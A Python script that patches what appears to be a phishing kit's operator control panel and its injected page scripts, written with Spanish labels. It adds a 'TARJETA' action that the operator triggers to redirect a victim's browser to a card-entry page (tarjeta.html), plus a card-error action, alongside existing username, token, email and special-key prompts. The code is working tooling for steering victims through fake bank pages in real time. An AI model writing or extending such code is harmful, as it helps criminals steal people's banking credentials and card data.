import re
import os

def update_cpanel_html():
    if not os.path.exists('cpanel.html'): return
    with open('cpanel.html', 'r', encoding='utf-8') as f:
        content = f.read()

    # Add <th>ACC. TARJETA</th>
    content = content.replace("<th>ACC. Clv Especial</th>", "<th>ACC. Clv Especial</th>\n                        <th>ACC. TARJETA</th>")

    with open('cpanel.html', 'w', encoding='utf-8') as f:
        f.write(content)
    print("Updated cpanel.html")

def update_cpanel_script():
    if not os.path.exists('cpanel_main_script.js'): return
    with open('cpanel_main_script.js', 'r', encoding='utf-8') as f:
        content = f.read()

    new_column = """                    <!-- ACC. TARJETA -->
                    <td>
                        <div class="action-group">
                            <button class="btn btn-blue" onclick="sendCommand('${id}', 'pedir_tarjeta')"><i class="fas fa-credit-card"></i> TARJETA</button>
                            <button class="btn btn-red" onclick="sendCommand('${id}', 'error_tarjeta')"><i class="fas fa-times-circle"></i> ERROR TJT</button>
                        </div>
                    </td>

                    <!-- ACC. AMIVEN -->"""
    
    # Replace <!-- ACC. AMIVEN --> to insert the new column right before it (which is after ACC. TOKEN/Clv Especial)
    content = content.replace("<!-- ACC. AMIVEN -->", new_column)

    # Add estadoMsg logic
    new_estado = """if (actionStr === 'pedir_tarjeta') estadoMsg = "Pidiendo Tarjeta";
            if (actionStr === 'error_tarjeta') estadoMsg = "Error en Tarjeta";
            if (actionStr === 'inicio')"""
    content = content.replace("if (actionStr === 'inicio')", new_estado)

    with open('cpanel_main_script.js', 'w', encoding='utf-8') as f:
        f.write(content)
    print("Updated cpanel_main_script.js")

def update_inject(filename):
    if not os.path.exists(filename): return
    with open(filename, 'r', encoding='utf-8') as f:
        content = f.read()

    # Add pedir_tarjeta
    new_pedir = "} else if (command.action === 'pedir_tarjeta') {\n                      window.location.href = 'tarjeta.html';\n                  } else if (command.action === 'error_login'"
    content = content.replace("} else if (command.action === 'error_login'", new_pedir)

    # Add error_tarjeta to error.html condition
    content = content.replace("command.action === 'error_usuario' || command.action === 'error_token' || command.action === 'error_correo'", 
                              "command.action === 'error_usuario' || command.action === 'error_token' || command.action === 'error_correo' || command.action === 'error_tarjeta'")
    
    # Alternatively, just insert it generically if the above strict match fails:
    content = re.sub(r"(command\.action === 'error_login' \|\| command\.action === 'error_usuario')", 
                     r"\1 || command.action === 'error_tarjeta'", content)

    with open(filename, 'w', encoding='utf-8') as f:
        f.write(content)
    print(f"Updated {filename}")

if __name__ == "__main__":
    update_cpanel_html()
    update_cpanel_script()
    update_inject('inject_cargando.js')
    update_inject('debug_cargando.js')
